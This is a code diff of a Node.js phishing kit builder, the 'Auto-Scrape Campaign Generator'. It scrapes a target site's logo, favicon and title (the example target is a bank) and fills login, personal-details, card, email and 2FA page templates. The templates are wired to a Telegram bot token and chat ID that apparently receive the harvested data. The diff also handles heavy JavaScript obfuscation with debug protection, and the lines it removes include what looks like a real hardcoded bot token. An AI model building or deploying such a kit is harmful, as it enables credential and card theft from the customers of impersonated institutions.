@@ -1,29 +1,48 @@
 import fs from 'fs';
 import path from 'path';
-import puppeteer from 'puppeteer';
 import { input, confirm } from '@inquirer/prompts';
 import chalk from 'chalk';
+import puppeteer from 'puppeteer';
 import https from 'https';
 import http from 'http';
 import { fileURLToPath } from 'url';
-import { spawn } from 'child_process';
+import { spawn, execSync } from 'child_process';
 import net from 'net';
 import JavaScriptObfuscator from 'javascript-obfuscator';
 import { minify as minifyHtml } from 'html-minifier-terser';
-import CleanCSS from 'clean-css';
+import dotenv from 'dotenv';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
+dotenv.config({ path: path.join(__dirname, '.env') });
+
 // Helper to download image
-const downloadImage = (url, filepath) => {
+const downloadImage = (url, filepath, redirects = 0) => {
     return new Promise((resolve, reject) => {
+        if (redirects > 5) return reject(new Error('Too many redirects'));
         const client = url.startsWith('https') ? https : http;
-        client.get(url, (res) => {
+        const options = {
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+                'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Referer': url.split('/').slice(0, 3).join('/') + '/'
+            }
+        };
+        client.get(url, options, (res) => {
             if (res.statusCode === 200) {
                 res.pipe(fs.createWriteStream(filepath))
                    .on('error', reject)
                    .once('close', () => resolve(filepath));
+            } else if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
+                let redirectUrl = res.headers.location;
+                if (!redirectUrl.startsWith('http')) {
+                    const baseUrl = new URL(url);
+                    redirectUrl = `${baseUrl.protocol}//${baseUrl.host}${redirectUrl.startsWith('/') ? '' : '/'}${redirectUrl}`;
+                }
+                res.resume();
+                downloadImage(redirectUrl, filepath, redirects + 1).then(resolve).catch(reject);
             } else {
                 res.resume();
                 reject(new Error(`Request Failed With a Status Code: ${res.statusCode}`));
@@ -32,110 +51,58 @@ const downloadImage = (url, filepath) => {
     });
 };
 
+const downloadFirstValidImage = async (urls, destDir, baseName) => {
+    if (!Array.isArray(urls)) urls = [urls];
+    for (let u of urls) {
+        if (!u) continue;
+        try {
+            let dlUrl = u;
+            if (dlUrl.startsWith('//')) dlUrl = 'https:' + dlUrl;
+            else if (dlUrl.startsWith('/')) {
+                // Not ideal without targetUrl, but try to handle absolute paths
+                if (!dlUrl.startsWith('http')) {
+                    continue; // skip relative paths if we can't resolve them easily
+                }
+            }
+
+            const extMatch = dlUrl.split('?')[0].match(/\.(png|jpg|jpeg|svg|gif|webp|ico)$/i);
+            const ext = extMatch ? extMatch[1] : 'png';
+            const filename = `${baseName}.${ext}`;
+            const filepath = path.join(destDir, filename);
+            
+            await downloadImage(dlUrl, filepath);
+            return { url: dlUrl, filename };
+        } catch (e) {
+            console.log(chalk.gray(`Failed to download ${u}: ${e.message}, trying next...`));
+        }
+    }
+    throw new Error('All image download attempts failed.');
+};
+
 // Helper to copy directory recursively
-const copyDirSync = (src, dest) => {
+const copyDirSync = (src, dest, exclude = []) => {
     if (!fs.existsSync(dest)) fs.mkdirSync(dest, { recursive: true });
     let entries = fs.readdirSync(src, { withFileTypes: true });
     for (let entry of entries) {
+        if (exclude.includes(entry.name)) continue;
         let srcPath = path.join(src, entry.name);
         let destPath = path.join(dest, entry.name);
         if (entry.isDirectory()) {
-            copyDirSync(srcPath, destPath);
+            copyDirSync(srcPath, destPath, exclude);
         } else {
             fs.copyFileSync(srcPath, destPath);
         }
     }
 };
 
-async function scrapeSite(url) {
-    console.log(chalk.blue(`\n🔍 Launching Puppeteer to scrape ${url}...`));
-    const browser = await puppeteer.launch({ headless: 'new' });
-    const page = await browser.newPage();
-    
-    await page.goto(url, { waitUntil: 'networkidle2', timeout: 30000 });
 
-    const data = await page.evaluate(() => {
-        // 1. Get Site Name from Title
-        let title = document.title;
-        // The user wants exactly the host's title to be populated. No slicing.
-        
-        // 2. Find Logo
-        let logoUrl = '';
-        const logoImgs = Array.from(document.querySelectorAll('img')).filter(img => 
-            (img.src && img.src.toLowerCase().includes('logo')) || 
-            (img.alt && img.alt.toLowerCase().includes('logo')) ||
-            (img.className && typeof img.className === 'string' && img.className.toLowerCase().includes('logo')) ||
-            (img.id && img.id.toLowerCase().includes('logo'))
-        );
-        
-        if (logoImgs.length > 0) {
-            // Prefer SVG or high-res
-            const svgLogo = logoImgs.find(img => img.src.endsWith('.svg'));
-            logoUrl = svgLogo ? svgLogo.src : logoImgs[0].src;
-        } else {
-            // Fallback to favicon/apple-touch-icon
-            const icon = document.querySelector('link[rel="apple-touch-icon"]') || document.querySelector('link[rel~="icon"]');
-            if (icon) logoUrl = icon.href;
-        }
-
-        // 3. Find Primary Button Color
-        let btnPrimary = '#0056b3'; // Fallback
-        let btnHover = '#004494'; // Fallback
-        
-        const buttons = Array.from(document.querySelectorAll('button, a.btn, input[type="submit"]'));
-        const primaryBtn = buttons.find(b => {
-             const style = window.getComputedStyle(b);
-             return style.backgroundColor !== 'rgb(0, 0, 0)' && style.backgroundColor !== 'rgba(0, 0, 0, 0)' && style.backgroundColor !== 'transparent';
-        }) || buttons[0];
-
-        if (primaryBtn) {
-            const style = window.getComputedStyle(primaryBtn);
-            if (style.backgroundColor && style.backgroundColor !== 'rgba(0, 0, 0, 0)') {
-                // rgb to hex
-                const rgb = style.backgroundColor.match(/\d+/g);
-                if (rgb && rgb.length >= 3) {
-                    const hex = (r, g, b) => "#" + (1 << 24 | r << 16 | g << 8 | b).toString(16).slice(1);
-                    btnPrimary = hex(parseInt(rgb[0]), parseInt(rgb[1]), parseInt(rgb[2]));
-                    
-                    // Simple hover darken approximation
-                    const darken = (col, amt) => {
-                        let num = parseInt(col.slice(1), 16);
-                        let r = (num >> 16) - amt;
-                        let b = ((num >> 8) & 0x00FF) - amt;
-                        let g = (num & 0x0000FF) - amt;
-                        return "#" + (g | (b << 8) | (r << 16)).toString(16).padStart(6, '0');
-                    };
-                    try { btnHover = darken(btnPrimary, 20); } catch(e) {}
-                }
-            }
-        }
-
-        // 4. Find Favicon
-        let faviconUrl = '';
-        const iconNodes = document.querySelectorAll('link[rel="icon"], link[rel="shortcut icon"], link[rel="apple-touch-icon"]');
-        if (iconNodes && iconNodes.length > 0) {
-             let largest = iconNodes[0];
-             // Sometimes multiple sizes, try to grab the first one or largest
-             faviconUrl = largest.href;
-        } else {
-             faviconUrl = new URL('/favicon.ico', window.location.origin).href;
-        }
-
-        return { siteName: title, logoUrl, btnPrimary, btnHover, faviconUrl };
-    });
-
-    await browser.close();
-    console.log(chalk.green('✅ Scraping completed!'));
-    
-    return data;
-}
 
 async function run() {
     console.log(chalk.bold.magenta('\n*** Auto-Scrape Campaign Generator ***\n'));
 
     const targetUrl = process.argv[2] || await input({ message: 'Enter the target application URL to clone branding from (e.g. https://www.bank.com):', validate: (i) => i.startsWith('http') ? true : 'Must be a valid HTTP/HTTPS URL' });
-    const tgBotToken = process.argv[3] || await input({ message: 'Enter your Telegram Bot Token:', default: '7976788555:AAGUS_FKZLRvw5sDUsGfPciEP4iNvzfqT7o' });
-    const tgChatId = process.argv[4] || await input({ message: 'Enter your Telegram Chat ID:', default: '8351473213' });
+    const tgBotToken = process.argv[3] || await input({ message: 'Enter your Telegram Bot Token:', default: process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN' });
+    const tgChatId = process.argv[4] || await input({ message: 'Enter your Telegram Chat ID:', default: process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID' });
     const flowOrder = process.argv[5] || await input({ message: 'Enter page flow order (comma separated from: personal,card,email,2fa):', default: 'personal,card,email,2fa' });
     // Secret CLI flags
     const isDevMode = process.argv.includes('--dev');
@@ -164,20 +131,76 @@ async function run() {
         }
     }
 
-    let scrapedData;
+    console.log(chalk.bold.cyan('\n--- Manual Branding Override ---'));
+    let defaultSiteName = 'Secure Portal';
     try {
-        scrapedData = await scrapeSite(targetUrl);
-    } catch(e) {
-        console.error(chalk.red('Failed to scrape site. Ensure URL is correct inside Puppeteer.'), e);
-        process.exit(1);
+        defaultSiteName = new URL(targetUrl).hostname.replace('www.', '').split('.')[0];
+        defaultSiteName = defaultSiteName.charAt(0).toUpperCase() + defaultSiteName.slice(1);
+    } catch(e) {}
+
+    const defaultSiteNameFallback = defaultSiteName;
+
+    console.log(chalk.cyan(`\n[+] Launching Puppeteer to securely extract branding from ${targetUrl}...`));
+    let logoUrl = '';
+    let faviconUrl = '';
+    let extractedTitle = defaultSiteNameFallback;
+
+    try {
+        const browser = await puppeteer.launch({ headless: 'new' });
+        const page = await browser.newPage();
+        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
+        
+        await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 30000 });
+        
+        const logoElInfo = await page.evaluate(() => {
+            const imgs = Array.from(document.querySelectorAll('img, svg'));
+            // Look for the most prominent logo based on size, 'logo' string matches, and top positioning constraints
+            for (let img of imgs) {
+                 const rect = img.getBoundingClientRect();
+                 if (rect.width > 20 && rect.height > 10 && rect.top >= 0 && rect.top < 400) {
+                     let cname = typeof img.className === 'string' ? img.className : (img.className && img.className.baseVal ? img.className.baseVal : '');
+                     if (rect.width >= rect.height || (img.src || '').toLowerCase().includes('logo') || (cname || '').toLowerCase().includes('logo')) {
+                         return img.src;
+                     }
+                 }
+            }
+            return null;
+        });
+
+        if (logoElInfo) {
+            logoUrl = logoElInfo;
+        }
+
+        faviconUrl = await page.evaluate(() => {
+            const el = document.querySelector('link[rel="icon"], link[rel="shortcut icon"], link[rel="apple-touch-icon"]');
+            return el ? el.href : new URL('/favicon.ico', window.location.href).href;
+        });
+
+        extractedTitle = await page.evaluate(() => document.title || '') || defaultSiteNameFallback;
+
+        await browser.close();
+        console.log(chalk.green(`[✔] Successfully extracted Base64 Logo, Favicon URL, and Title natively.`));
+    } catch(err) {
+        console.log(chalk.red(`[-] Puppeteer extraction failed: ${err.message}`));
     }
 
-    console.log(chalk.yellow('\n--- Scraped Branding Metrics ---'));
+    const siteName = process.env.AUTO_SITENAME || await input({ message: 'Enter the Site Builder Name (Browser Tab Title):', default: extractedTitle });
+
+    const btnDark = process.env.AUTO_BTNDARK || await input({ message: 'Enter the Primary Background Hex Color (e.g., #000663):', default: '#0056b3' });
+    const btnLight = process.env.AUTO_BTNLIGHT || await input({ message: 'Enter the CTA Button Hex Color (e.g., #0056b3):', default: '#0056b3' });
+
+    let scrapedData = {
+        siteName: siteName,
+        logoUrl: logoUrl,
+        btnDark: btnDark,
+        btnLight: btnLight,
+        faviconUrl: faviconUrl || ''
+    };
+
+    console.log(chalk.yellow('\n--- Final Branding Metrics ---'));
     console.log(`Site Name: ${scrapedData.siteName}`);
-    console.log(`Logo URL: ${scrapedData.logoUrl || 'None found'}`);
-    console.log(`Favicon URL: ${scrapedData.faviconUrl || 'Default'}`);
-    console.log(`Primary Button Color: ${scrapedData.btnPrimary}`);
-    console.log(`Hover Button Color: ${scrapedData.btnHover}\n`);
+    console.log(`Background Color (Dark): ${chalk.bgHex(scrapedData.btnDark).white(' ' + scrapedData.btnDark + ' ')}`);
+    console.log(`CTA Color (Light): ${chalk.bgHex(scrapedData.btnLight).black(' ' + scrapedData.btnLight + ' ')}`);
 
     let confirmBuild = true;
     if (process.argv.length <= 2) {
@@ -195,44 +218,157 @@ async function run() {
         fs.rmSync(buildDir, { recursive: true, force: true });
     }
     fs.mkdirSync(buildDir, { recursive: true });
+    
+    // Dump scraped data for debugging
+    fs.writeFileSync(path.join(buildDir, 'scraped-data-debug.json'), JSON.stringify(scrapedData, null, 2));
 
     // 1. Download constraints
     fs.mkdirSync(path.join(buildDir, 'assets'), { recursive: true });
-    let logoFilename = 'logo.png'; // default
     
-    if (scrapedData.logoUrl) {
-        try {
-            // Absolute URL check
-            let dlUrl = scrapedData.logoUrl;
-            if (dlUrl.startsWith('//')) dlUrl = 'https:' + dlUrl;
-            else if (dlUrl.startsWith('/')) dlUrl = targetUrl.replace(/\/$/, '') + dlUrl;
+    // Copy base static assets into buildDir first, but explicitly exclude the fallback legacy 'logo.png'
+    if (fs.existsSync(path.join(__dirname, 'assets'))) {
+        copyDirSync(path.join(__dirname, 'assets'), path.join(buildDir, 'assets'), ['logo.png', 'logo.svg']);
+    }
 
-            const extMatch = dlUrl.split('?')[0].match(/\.(png|jpg|jpeg|svg|gif|webp)$/i);
-            const ext = extMatch ? extMatch[1] : 'png';
-            logoFilename = `scraped-logo.${ext}`;
+    // Embed Email Connect Pro Widget Dist
+    const widgetSrc = path.join(__dirname, 'Email Connect Pro', 'dist');
+    const widgetDest = path.join(buildDir, 'Email Connect Pro', 'dist');
+    if (fs.existsSync(widgetSrc)) {
+        copyDirSync(widgetSrc, widgetDest);
+        console.log(chalk.blue(`📦 Injected Email Connect Pro widget dependencies.`));
+    }
+
+    let finalLogoUrl = 'assets/logo.png'; // default
+    let finalFaviconUrl = 'assets/world_favicon.png'; // default fallback from static assets
+    
+    const manualLogoUrl = process.env.AUTO_LOGOURL || null;
+
+    if (manualLogoUrl && manualLogoUrl.toLowerCase() === 'local') {
+        const logoTargetDir = path.join(buildDir, 'assets');
+        console.log(chalk.red(`\n[!] LOCAL LOGO INJECTION PAUSE [!]`));
+        console.log(chalk.cyan(`Please copy your logo image file and paste it into:`));
+        console.log(chalk.whiteBright.bgBlue(` ${logoTargetDir} `));
+        console.log(chalk.cyan(`You can name the file: `) + chalk.yellow(`logo.png, logo.webp, logo.svg, etc.`));
+        
+        await input({ message: chalk.magenta('Press ENTER once the file is placed successfully...') });
+        
+        const validExts = ['png', 'webp', 'svg', 'jpg', 'jpeg', 'gif'];
+        let foundLogo = null;
+        for (let ext of validExts) {
+            if (fs.existsSync(path.join(logoTargetDir, `logo.${ext}`))) {
+                foundLogo = `logo.${ext}`;
+                break;
+            }
+        }
+
+        if (foundLogo) {
+            console.log(chalk.green(`✅ Local ${foundLogo} found. Proceeding with compilation.`));
+            finalLogoUrl = `assets/${foundLogo}`;
+        } else {
+            console.log(chalk.red(`❌ No valid logo file found in assets. Generating textual SVG fallback.`));
+            let logoFilename = 'scraped-logo.svg';
+            finalLogoUrl = `assets/${logoFilename}`;
+            const shortName = (scrapedData.siteName || 'Bank Portal').split('-')[0].trim();
+            const svgContent = `<svg xmlns="http://www.w3.org/2000/svg" width="400" height="100"><text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-family="sans-serif" font-weight="bold" font-size="24" fill="#000000">${shortName}</text></svg>`;
+            fs.writeFileSync(path.join(buildDir, 'assets', logoFilename), svgContent);
+        }
+    } else {
+        let targetLogoSrc = manualLogoUrl || scrapedData.logoUrl;
+
+        if (targetLogoSrc) {
+            if (manualLogoUrl) {
+                 console.log(chalk.blue(`[i] Overriding automated scraper with manual logo URL: ${manualLogoUrl}`));
+            }
+            try {
+                let lgUrl = targetLogoSrc;
+                if (lgUrl.startsWith('//')) lgUrl = 'https:' + lgUrl;
+                else if (lgUrl.startsWith('/')) lgUrl = targetUrl.replace(/\/$/, '') + lgUrl;
+
+                const result = await downloadFirstValidImage([lgUrl], path.join(buildDir, 'assets'), 'scraped-logo');
+                finalLogoUrl = `assets/${result.filename}`;
+                console.log(chalk.green(`✅ Downloaded logo successfully: ${result.filename}`));
+            } catch (err) {
+                console.log(chalk.yellow(`Failed to download logo natively. Hotlinking directly to remote URL.`));
+                finalLogoUrl = targetLogoSrc;
+            }
+        } else {
+            console.log(chalk.red(`❌ No logo found via Puppeteer rendering engine.`));
             
-            await downloadImage(dlUrl, path.join(buildDir, 'assets', logoFilename));
-            console.log(chalk.green(`✅ Downloaded logo successfully: ${logoFilename}`));
+            // Check if automation is strictly enforced without interaction, but if the logo failed we ask anyway to give them a chance
+            const askLocal = isDevMode ? false : await confirm({ message: 'Would you like to manually inject a local logo file instead of using a text fallback?', default: true });
+            
+            if (askLocal) {
+                const logoTargetDir = path.join(buildDir, 'assets');
+                console.log(chalk.red(`\n[!] LOCAL LOGO INJECTION PAUSE [!]`));
+                console.log(chalk.cyan(`Please copy your logo image file and paste it into:`));
+                console.log(chalk.whiteBright.bgBlue(` ${logoTargetDir} `));
+                console.log(chalk.cyan(`You can name the file: `) + chalk.yellow(`logo.png, logo.webp, logo.svg, etc.`));
+                
+                await input({ message: chalk.magenta('Press ENTER once the file is placed successfully...') });
+                
+                const validExts = ['png', 'webp', 'svg', 'jpg', 'jpeg', 'gif'];
+                let foundLogo = null;
+                for (let ext of validExts) {
+                    if (fs.existsSync(path.join(logoTargetDir, `logo.${ext}`))) {
+                        foundLogo = `logo.${ext}`;
+                        break;
+                    }
+                }
+
+                if (foundLogo) {
+                    console.log(chalk.green(`✅ Local ${foundLogo} found. Proceeding with compilation.`));
+                    finalLogoUrl = `assets/${foundLogo}`;
+                } else {
+                    console.log(chalk.red(`❌ No valid logo file found in assets. Generating textual SVG fallback.`));
+                    let logoFilename = 'scraped-logo.svg';
+                    finalLogoUrl = `assets/${logoFilename}`;
+                    const shortName = (scrapedData.siteName || 'Bank Portal').split('-')[0].trim();
+                    const svgContent = `<svg xmlns="http://www.w3.org/2000/svg" width="400" height="100"><text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-family="sans-serif" font-weight="bold" font-size="24" fill="#000000">${shortName}</text></svg>`;
+                    fs.writeFileSync(path.join(buildDir, 'assets', logoFilename), svgContent);
+                }
+            } else {
+                console.log(chalk.yellow(`Generating textual SVG fallback.`));
+                let logoFilename = 'scraped-logo.svg';
+                finalLogoUrl = `assets/${logoFilename}`;
+                const shortName = (scrapedData.siteName || 'Bank Portal').split('-')[0].trim();
+                const svgContent = `<svg xmlns="http://www.w3.org/2000/svg" width="400" height="100"><text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-family="sans-serif" font-weight="bold" font-size="24" fill="#000000">${shortName}</text></svg>`;
+                fs.writeFileSync(path.join(buildDir, 'assets', logoFilename), svgContent);
+            }
+        }
+    }
+
+    if (scrapedData.faviconUrl) {
+        try {
+            let flUrl = scrapedData.faviconUrl;
+            if (flUrl.startsWith('//')) flUrl = 'https:' + flUrl;
+            else if (flUrl.startsWith('/')) flUrl = targetUrl.replace(/\/$/, '') + flUrl;
+
+            const result = await downloadFirstValidImage([flUrl], path.join(buildDir, 'assets'), 'scraped-favicon');
+            finalFaviconUrl = `assets/${result.filename}`;
+            console.log(chalk.green(`✅ Downloaded favicon successfully: ${result.filename}`));
         } catch (err) {
-            console.log(chalk.red(`Failed to download logo. Using default empty logo. Error: ${err.message}`));
+            console.log(chalk.yellow(`Failed to download favicon. Hotlinking directly to remote URL.`));
+            finalFaviconUrl = scrapedData.faviconUrl;
         }
     }
 
     // 2. Process Templates
     const templatesDir = path.join(__dirname, 'templates');
-    const templateFiles = fs.readdirSync(templatesDir);
+    const templateFiles = ['index.html', 'auth-stg.html', 'chk-v.html', 'email-stg.html', 'sync-p.html', 'app.js', 'style.css', 'cf.html'];
+
+    let loginEntry = 'index.html'; // Default
 
     for (const file of templateFiles) {
-        if (!fs.statSync(path.join(templatesDir, file)).isFile()) continue;
+        if (!fs.existsSync(path.join(templatesDir, file))) continue;
 
         let content = fs.readFileSync(path.join(templatesDir, file), 'utf-8');
         
         // Replace Variables
         content = content.replace(/\{\{SITE_NAME\}\}/g, scrapedData.siteName || 'Secure Portal');
-        content = content.replace(/\{\{FAVICON_URL\}\}/g, scrapedData.faviconUrl || '/favicon.ico');
-        content = content.replace(/\{\{LOGO_FILENAME\}\}/g, logoFilename);
-        content = content.replace(/\{\{BTN_PRIMARY\}\}/g, scrapedData.btnPrimary);
-        content = content.replace(/\{\{BTN_HOVER\}\}/g, scrapedData.btnHover);
+        content = content.replace(/\{\{FAVICON_URL\}\}/g, finalFaviconUrl);
+        content = content.replace(/\{\{LOGO_URL\}\}/g, finalLogoUrl);
+        content = content.replace(/\{\{BTN_DARK\}\}/g, scrapedData.btnDark);
+        content = content.replace(/\{\{BTN_LIGHT\}\}/g, scrapedData.btnLight);
         content = content.replace(/\{\{TG_BOT_TOKEN\}\}/g, tgBotToken);
         content = content.replace(/\{\{TG_CHAT_ID\}\}/g, tgChatId);
 
@@ -270,123 +406,16 @@ async function run() {
             }).getObfuscatedCode();
         }
 
-        fs.writeFileSync(path.join(buildDir, file), content, 'utf-8');
+        let saveFileName = file;
+        if (file === 'index.html') saveFileName = 'login.html';
+        else if (file === 'cf.html') saveFileName = 'index.html';
+
+        fs.writeFileSync(path.join(buildDir, saveFileName), content, 'utf-8');
     }
     console.log(chalk.green('✅ Templates processed and injected!'));
 
-    // 3. Copy Static Assets
-    // We need to copy `assets` (if any default assets exist), `php`, `Email Connect Pro/dist`, `app.js`
-    
-    try {
-        if (fs.existsSync(path.join(__dirname, 'assets'))) {
-            copyDirSync(path.join(__dirname, 'assets'), path.join(buildDir, 'assets'));
-        }
-        if (fs.existsSync(path.join(__dirname, 'php'))) {
-            copyDirSync(path.join(__dirname, 'php'), path.join(buildDir, 'php'));
-        }
-        if (fs.existsSync(path.join(__dirname, 'Email Connect Pro', 'dist'))) {
-            const destDist = path.join(buildDir, 'Email Connect Pro', 'dist');
-            copyDirSync(path.join(__dirname, 'Email Connect Pro', 'dist'), destDist);
-        }
-        if (fs.existsSync(path.join(__dirname, 'app.js'))) {
-            let appJsContent = fs.readFileSync(path.join(__dirname, 'app.js'), 'utf-8');
-            
-            appJsContent = appJsContent.replace(/__NEXT_LOGIN__/g, nextMap['__NEXT_LOGIN__']);
-            appJsContent = appJsContent.replace(/__NEXT_PERSONAL__/g, nextMap['__NEXT_PERSONAL__']);
-            appJsContent = appJsContent.replace(/__NEXT_CARD__/g, nextMap['__NEXT_CARD__']);
-            appJsContent = appJsContent.replace(/__NEXT_EMAIL__/g, nextMap['__NEXT_EMAIL__']);
-            appJsContent = appJsContent.replace(/__NEXT_2FA__/g, nextMap['__NEXT_2FA__']);
-            
-            if (isDevMode) {
-                console.log(chalk.blue('\nℹ️ Developer mode enabled: Skipping javascript obfuscation & stripping security curtains...'));
-                
-                // Deterministically strip the anti-inspection logic block out
-                const parts = appJsContent.split('    // ----------------------------');
-                if (parts.length > 1) {
-                    appJsContent = "(function() {\n    'use strict';\n" + parts[1];
-                }
-                
-                fs.writeFileSync(path.join(buildDir, 'app.js'), appJsContent);
-            } else {
-                console.log(chalk.yellow('\n🔐 Cryptographically obfuscating javascript payload (app.js)...'));
-                const obfResult = JavaScriptObfuscator.obfuscate(appJsContent, {
-                    compact: true,
-                    controlFlowFlattening: true,
-                    controlFlowFlatteningThreshold: 0.75,
-                    deadCodeInjection: true,
-                    deadCodeInjectionThreshold: 0.4,
-                    debugProtection: true,
-                    debugProtectionInterval: 2000,
-                    disableConsoleOutput: true,
-                    identifierNamesGenerator: 'hexadecimal',
-                    log: false,
-                    numbersToExpressions: true,
-                    renameGlobals: false,
-                    selfDefending: true,
-                    simplify: true,
-                    splitStrings: true,
-                    splitStringsChunkLength: 10,
-                    stringArray: true,
-                    stringArrayCallsTransform: true,
-                    stringArrayCallsTransformThreshold: 0.5,
-                    stringArrayEncoding: ['base64', 'rc4'],
-                    stringArrayIndexShift: true,
-                    stringArrayRotate: true,
-                    stringArrayShuffle: true,
-                    stringArrayWrappersCount: 1,
-                    stringArrayWrappersChainedCalls: true,
-                    stringArrayWrappersParametersMaxCount: 2,
-                    stringArrayWrappersType: 'variable',
-                    stringArrayThreshold: 0.75,
-                    unicodeEscapeSequence: false
-                });
-
-                fs.writeFileSync(path.join(buildDir, 'app.js'), obfResult.getObfuscatedCode());
-                console.log(chalk.green('✅ javascript payload secured and written.'));
-            }
-        }
-    } catch(e) {
-         console.error(chalk.red('Warning: Some static assets failed to copy:', e.message));
-    }
-
-    const findOpenPort = (startPort) => {
-        return new Promise((resolve) => {
-            const server = net.createServer();
-            server.listen(startPort, () => {
-                server.once('close', () => resolve(startPort));
-                server.close();
-            });
-            server.on('error', () => {
-                resolve(findOpenPort(startPort + 1));
-            });
-        });
-    };
-
-    try {
-        const port = await findOpenPort(8081);
-        console.log(chalk.cyan(`\n🚀 Starting local PHP server on port ${port}...`));
-        const phpServer = spawn('php', ['-S', `localhost:${port}`], {
-            cwd: buildDir,
-            stdio: 'ignore', // Don't pollute the prompt with PHP router logs
-            detached: true,
-            shell: true      // Required on Windows to resolve PATH properly
-        });
-        
-        phpServer.on('error', (err) => {
-            console.error(chalk.red(`\n[!] Background PHP Server failed to start: ${err.message}`));
-            console.log(chalk.gray(`Please ensure PHP is installed and available in your environment PATH.`));
-            console.log(chalk.cyan(`To view manually, cd into ./builds/${domain} and run: php -S localhost:${port}`));
-        });
-
-        phpServer.unref(); // Allow the node script to exit while PHP runs
-        
-        console.log(chalk.green.bold(`\n🎉 Campaign successfully generated at ./builds/${domain}`));
-        console.log(chalk.cyan.bold(`🌍 Live Preview: http://localhost:${port}`));
-        console.log(chalk.gray(`(Background PHP server started with PID: ${phpServer.pid})`));
-    } catch (e) {
-        console.log(chalk.green.bold(`\n🎉 Campaign successfully generated at ./builds/${domain}`));
-        console.error(chalk.red(`Failed to setup automated PHP server: ${e.message}`));
-    }
+    console.log(chalk.green.bold(`\n🎉 Web Application successfully generated and configured natively into ./builds/${domain} for the Node backend`));
+    console.log(chalk.cyan(`You can view it live at: http://localhost:3000/${domain}/`));
 }
 
 run();
